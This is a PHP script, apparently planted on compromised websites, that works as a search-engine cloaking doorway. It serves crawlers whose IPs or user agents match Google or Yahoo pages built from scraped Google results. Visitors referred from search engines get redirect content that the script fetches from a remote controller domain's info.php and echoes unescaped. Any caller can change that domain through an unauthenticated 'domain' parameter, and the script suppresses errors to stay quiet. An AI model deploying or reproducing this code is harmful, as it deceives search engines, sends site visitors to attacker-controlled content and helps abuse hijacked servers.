<?php
$name = 'u';
ignore_user_abort(1);
set_time_limit(0);
error_reporting(0);
define("PATH", dirname(__FILE__));
define("ZONA", ".com"); /* zona googla */
define("NUM_PAGE", 100); /* skolko vivodit na pagu snippetov */

(file_exists(PATH.'/template.tpl')) ? $tpl = file_get_contents(PATH.'/template.tpl') : die("Error tpl\r\n");
if(!empty($_GET['domain'])) footer_inc($_GET['domain']);
else main();

//curl crawling
function crawl_page($url) {
	if(function_exists('file_get_contents')){
		$result = file_get_contents ($url);
	}
	if(!isset($result) || $result == '' || !$result){
	if(function_exists('curl_init')){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_ENCODING, "gzip");
		curl_setopt($ch, CURLOPT_TIMEOUT, 200);
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)");
		$result = curl_exec($ch);
		curl_close($ch);
	}else{
		$url = parse_url($url);
		$fp = @fsockopen($url['host'], 80, $errno, $errstr, 10);
		if ($fp) {
			@fputs($fp, "GET {$url['path']} HTTP/1.0\r\nHost: {$url['host']}\r\n");
			@fputs($fp, "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)\r\n\r\n");
			while (!@feof($fp)) {
				$buff .= @fgets($fp, 128);
			}
			@fclose($fp);
		}
	$result = $buff;
	}
	}
	return $result; // file_get_contents ($url);
}
function redirect() {
	//header("Location: http://google.com");
	if( filemtime(PATH.'/foot.dat') <  (time() - 3600)){
		footer_inc(file_get_contents(PATH.'/foot.dat'));
	}
	list($red, $cc) = explode("|!|", file_get_contents(PATH.'/data.dat'));
	echo stripslashes($red);
}
function footer_inc($domain){
	if(!empty($domain)){
		list($red, $shet) = explode("|!|", addslashes(crawl_page("http://".$domain."/info.php")));
		fwrite(fopen(PATH.'/foot.dat',"w"), $domain);
		fwrite(fopen(PATH.'/data.dat',"w"), str_replace("\\","", $red.$shet));
		$tmpFiles = scandir(PATH.'/.xcache/');
		unset($tmpFiles[0],$tmpFiles[1]);
		//foreach($tmpFiles as $file) unlink(PATH.'/.xcache/'.$file);
	} else return false;
}
function parsing_google($query){
	$url = "http://www.google".ZONA."/images?hl=ru&gbv=2&tbs=isch%3A1&sa=1&q=".str_replace(" ", "+", $query)."&aq=f&aqi=&aql=&oq=&gs_rfai=";
	$page = crawl_page($url);
	$resultIMG = preg_match_all("#dyn.setResults\((.+)\)\;\</#", $page, $imgmatch, PREG_SET_ORDER);
	$tmpArr = $pic = array();
	$str = $imgmatch[0][1];
	
	preg_match_all("#http://[^\s\"\'\,]+(gif|jpg|png|jpeg)#is", $str, $images);
	
	$images = array_values(array_unique($images[0]));	
	if(!empty($images)) return $images;
	return false;
}

//SE parsing
function gen_page($keyword) {
	global $name, $tpl;
	$var = $_GET[$name];
	$today = date("M j, y");
	$url = "http://www.google.com/search?hl=en&client=opera&num=".NUM_PAGE."&q=" . urlencode($keyword) . "&lr=lang_en";
	$result = crawl_page($url);
	preg_match_all("#<div class=\"s\">(.*)<br>#U", $result, $result_preg);
	$s = array();
	for ($i = 0; $i < count($result_preg[1]); $i++) {
		$snippet = trim($result_preg[1][$i]);
		$snippet = strip_tags($snippet, '<em><strong>');
		$snippet = str_replace('<em', '<strong', $snippet);
		$snippet = str_replace('</em', '</strong', $snippet);
		$snippet = str_replace("...", ". ", $snippet);
		array_push($s, $snippet);
	}
	shuffle($s); //print_r ($s);
	//get related keys
	$result = crawl_page("http://clients1.google.com/complete/search?hl=en&q=" . str_replace(" ", "%20", $keyword));
	preg_match_all("|\[\"([^\"]+)\",|si", $result, $out, PREG_PATTERN_ORDER);
	$str = str_replace("{TITLE}", ucwords($keyword), $tpl);

	$result_snippet = preg_match_all("#\{SNIPPET\_(\d+)\_(\d+)(.*)\}#", $tpl, $match);
	if(!empty($result_snippet)){
		for($cs = 0, $count_snippet = count($match[2]); $cs < $count_snippet; $cs++){
			$snippets = '';
			for($z = $match[1][$cs]; $z <= $match[2][$cs]; $z++)
			$snippets .= (!empty($match[3][$cs])) ? "<p id=\"".$match[3][$cs]."\">".$s[$z]."</p>" : "<p>".$s[$z]."</p>";
			$add = (!empty($match[3][$cs])) ? $match[3][$cs] : '';
			$str = str_replace("{SNIPPET_".$match[1][$cs]."_".$match[2][$cs].$add."}", $snippets, $str);
		}
	}
	/*
	* poluchili pik4i c googla
	*/
	$img = parsing_google($keyword);
	foreach($img as $k => $v){
		//echo('<br>'."{IMG_{$k}}".'<br>');
		$str = str_replace("{IMG_{$k}}", $v, $str);
	}
	$str = str_replace("{DATE}", $today, $str);
	$str = str_replace("{KEYWORD}", strtoupper($keyword), $str);
	/*
	* razbiraem pohozie keywords
	*/
	$cnt = 0;
	array_shift($out[1]);
	foreach ($out[1] as $key) {
		$tag .= "	<div class='tag'><a href='?" . $name . "=" . str_replace(" ", "-", $key) . "'>" . $key . "</a></div>\n";
		if ($cnt++ > 11) break;
	}
	$str = str_replace("{RELATED_KEYWORDS}", $tag, $str);
	$str = str_replace("{FOOTER_INCLUDE}", stripslashes(file_get_contents(PATH.'/foot.dat')), $str);
	$str = str_replace("{FREE_HTML}", file_get_contents(PATH.'/html.dat'), $str);
	
	//echo($str);
	return $str;
}
function get_page($key) {
	$f_n=".xcache/" . $key . ".htm";
	if (file_exists($f_n)) return file_get_contents($f_n);
	$keyword=str_replace("-", " ", $key);
	$result=gen_page($keyword);
	$f=fopen($f_n, "w");
	fwrite($f, $result);
	fclose($f);
	return $result;
}
function is_search_bots() {
	$ua = $_SERVER["HTTP_USER_AGENT"];
	$htr = $_SERVER["HTTP_REFERER"];
	$flag_g = stristr($ua, "google");
	$flag_y = stristr($ua, "yahoo");
	if ($flag_g || $flag_y) {
		$inf = date("Y-m-d H:i:s") . "|" . $ua . "|" . $_SERVER["REMOTE_ADDR"] . "|" . $_SERVER["REQUEST_URI"] . "\r\n";
		$fp = fopen("stats.txt", "a");
		fwrite($fp, $inf);
		fclose($fp);
	}
	$ips = array("91.124.6.222","178.95.4.215","87.254.138.33","94.100.31.74","89.149.242.16","78.140.171.250","209.185.108","209.185.253","209.85.238","209.85.238.11","209.85.238.4","216.239.33.96","216.239.33.97","216.239.33.98","216.239.33.99","216.239.37.98","216.239.37.99","216.239.39.98","216.239.39.99","216.239.41.96","216.239.41.97","216.239.41.98","216.239.41.99","216.239.45.4","216.239.46","216.239.51.96","216.239.51.97","216.239.51.98","216.239.51.99","216.239.53.98","216.239.53.99","216.239.57.96","216.239.57.97","216.239.57.98","216.239.57.99","216.239.59.98","216.239.59.99","216.33.229.163","64.233.173.193","64.233.173.194","64.233.173.195","64.233.173.196","64.233.173.197","64.233.173.198","64.233.173.199","64.233.173.200","64.233.173.201","64.233.173.202","64.233.173.203","64.233.173.204","64.233.173.205","64.233.173.206","64.233.173.207","64.233.173.208","64.233.173.209","64.233.173.210","64.233.173.211","64.233.173.212","64.233.173.213","64.233.173.214","64.233.173.215","64.233.173.216","64.233.173.217","64.233.173.218","64.233.173.219","64.233.173.220","64.233.173.221","64.233.173.222","64.233.173.223","64.233.173.224","64.233.173.225","64.233.173.226","64.233.173.227","64.233.173.228","64.233.173.229","64.233.173.230","64.233.173.231","64.233.173.232","64.233.173.233","64.233.173.234","64.233.173.235","64.233.173.236","64.233.173.237","64.233.173.238","64.233.173.239","64.233.173.240","64.233.173.241","64.233.173.242","64.233.173.243","64.233.173.244","64.233.173.245","64.233.173.246","64.233.173.247","64.233.173.248","64.233.173.249","64.233.173.250","64.233.173.251","64.233.173.252","64.233.173.253","64.233.173.254","64.233.173.255","64.68.80","64.68.81","64.68.82","64.68.83","64.68.84","64.68.85","64.68.86","64.68.87","64.68.88","64.68.89","64.68.90.1","64.68.90.10","64.68.90.11","64.68.90.12","64.68.90.129","64.68.90.13","64.68.90.130","64.68.90.131","64.68.90.132","64.68.90.133","64.68.90.134","64.68.90.135","64.68.90.136","64.68.90.137","64.68.90.138","64.68.90.139","64.68.90.14","64.68.90.140","64.68.90.141","64.68.90.142","64.68.90.143","64.68.90.144","64.68.90.145","64.68.90.146","64.68.90.147","64.68.90.148","64.68.90.149","64.68.90.15","64.68.90.150","64.68.90.151","64.68.90.152","64.68.90.153","64.68.90.154","64.68.90.155","64.68.90.156","64.68.90.157","64.68.90.158","64.68.90.159","64.68.90.16","64.68.90.160","64.68.90.161","64.68.90.162","64.68.90.163","64.68.90.164","64.68.90.165","64.68.90.166","64.68.90.167","64.68.90.168","64.68.90.169","64.68.90.17","64.68.90.170","64.68.90.171","64.68.90.172","64.68.90.173","64.68.90.174","64.68.90.175","64.68.90.176","64.68.90.177","64.68.90.178","64.68.90.179","64.68.90.18","64.68.90.180","64.68.90.181","64.68.90.182","64.68.90.183","64.68.90.184","64.68.90.185","64.68.90.186","64.68.90.187","64.68.90.188","64.68.90.189","64.68.90.19","64.68.90.190","64.68.90.191","64.68.90.192","64.68.90.193","64.68.90.194","64.68.90.195","64.68.90.196","64.68.90.197","64.68.90.198","64.68.90.199","64.68.90.2","64.68.90.20","64.68.90.200","64.68.90.201","64.68.90.202","64.68.90.203","64.68.90.204","64.68.90.205","64.68.90.206","64.68.90.207","64.68.90.208","64.68.90.21","64.68.90.22","64.68.90.23","64.68.90.24","64.68.90.25","64.68.90.26","64.68.90.27","64.68.90.28","64.68.90.29","64.68.90.3","64.68.90.30","64.68.90.31","64.68.90.32","64.68.90.33","64.68.90.34","64.68.90.35","64.68.90.36","64.68.90.37","64.68.90.38","64.68.90.39","64.68.90.4","64.68.90.40","64.68.90.41","64.68.90.42","64.68.90.43","64.68.90.44","64.68.90.45","64.68.90.46","64.68.90.47","64.68.90.48","64.68.90.49","64.68.90.5","64.68.90.50","64.68.90.51","64.68.90.52","64.68.90.53","64.68.90.54","64.68.90.55","64.68.90.56","64.68.90.57","64.68.90.58","64.68.90.59","64.68.90.6","64.68.90.60","64.68.90.61","64.68.90.62","64.68.90.63","64.68.90.64","64.68.90.65","64.68.90.66","64.68.90.67","64.68.90.68","64.68.90.69","64.68.90.7","64.68.90.70","64.68.90.71","64.68.90.72","64.68.90.73","64.68.90.74","64.68.90.75","64.68.90.76","64.68.90.77","64.68.90.78","64.68.90.79","64.68.90.8","64.68.90.80","64.68.90.9","64.68.91","64.68.92","66.249.64","66.249.65","66.249.66","66.249.67","66.249.68","66.249.69","66.249.70","66.249.71","66.249.72","66.249.73","66.249.78","66.249.79","72.14.199","8.6.48","64.20.40.82");
	$thisip = $_SERVER["REMOTE_ADDR"];
	$isbot = false;
	$zones = array(".AC", ".AD", ".AE", ".AERO", ".AF", ".AG", ".AI", ".AL", ".AM", ".AN", ".AO", ".AQ", ".AR", ".ARPA", ".AS", ".ASIA", ".AT", ".AU", ".AW", ".AX", ".AZ", ".BA", ".BB", ".BD", ".BE", ".BF", ".BG", ".BH", ".BI", ".BIZ", ".BJ", ".BM", ".BN", ".BO", ".BR", ".BS", ".BT", ".BV", ".BW", ".BY", ".BZ", ".CA", ".CAT", ".CC", ".CD", ".CF", ".CG", ".CH", ".CI", ".CK", ".CL", ".CM", ".CN", ".CO", ".COM", ".COOP", ".CR", ".CU", ".CV", ".CX", ".CY", ".CZ", ".DE", ".DJ", ".DK", ".DM", ".DO", ".DZ", ".EC", ".EDU", ".EE", ".EG", ".ER", ".ES", ".ET", ".EU", ".FI", ".FJ", ".FK", ".FM", ".FO", ".FR", ".GA", ".GB", ".GD", ".GE", ".GF", ".GG", ".GH", ".GI", ".GL", ".GM", ".GN", ".GOV", ".GP", ".GQ", ".GR", ".GS", ".GT", ".GU", ".GW", ".GY", ".HK", ".HM", ".HN", ".HR", ".HT", ".HU", ".ID", ".IE", ".IL", ".IM", ".IN", ".INFO", ".INT", ".IO", ".IQ", ".IR", ".IS", ".IT", ".JE", ".JM", ".JO", ".JOBS", ".JP", ".KE", ".KG", ".KH", ".KI", ".KM", ".KN", ".KP", ".KR", ".KW", ".KY", ".KZ", ".LA", ".LB", ".LC", ".LI", ".LK", ".LR", ".LS", ".LT", ".LU", ".LV", ".LY", ".MA", ".MC", ".MD", ".ME", ".MG", ".MH", ".MIL", ".MK", ".ML", ".MM", ".MN", ".MO", ".MOBI", ".MP", ".MQ", ".MR", ".MS", ".MT", ".MU", ".MUSEUM", ".MV", ".MW", ".MX", ".MY", ".MZ", ".NA", ".NAME", ".NC", ".NE", ".NET", ".NF", ".NG", ".NI", ".NL", ".NO", ".NP", ".NR", ".NU", ".NZ", ".OM", ".ORG", ".PA", ".PE", ".PF", ".PG", ".PH", ".PK", ".PL", ".PM", ".PN", ".PR", ".PRO", ".PS", ".PT", ".PW", ".PY", ".QA", ".RE", ".RO", ".RS", ".RU", ".RW", ".SA", ".SB", ".SC", ".SD", ".SE", ".SG", ".SH", ".SI", ".SJ", ".SK", ".SL", ".SM", ".SN", ".SO", ".SR", ".ST", ".SU", ".SV", ".SY", ".SZ", ".TC", ".TD", ".TEL", ".TF", ".TG", ".TH", ".TJ", ".TK", ".TL", ".TM", ".TN", ".TO", ".TP", ".TR", ".TT", ".TV", ".TW", ".TZ", ".UA", ".UG", ".UK", ".US", ".UY", ".UZ", ".VA", ".VC", ".VE", ".VG", ".VI", ".VN", ".VU", ".WF", ".WS", ".YE", ".YT", ".YU", ".ZA", ".ZM", ".ZW");
	foreach($ips as $ip) if(stristr($thisip, $ip)) return true;
	return false;
}

function main() {
	global $name;
	$htr = $_SERVER["HTTP_REFERER"];
	//var_dump(is_search_bots()); die();
	//echo($htr." ".$_SERVER["REMOTE_ADDR"]);
	if (@$_GET[$name] != "") {
		$page = basename($_GET[$name]);
		@mkdir(".xcache");
		@chmod(".xcache", 0750);
		if (is_search_bots()) {
			print get_page($page);
		exit;
		} elseif(stristr($htr, "google") || stristr($htr, "yahoo")){
			redirect();
		} else {
			exit;
		}
	}
}
//main();
?>
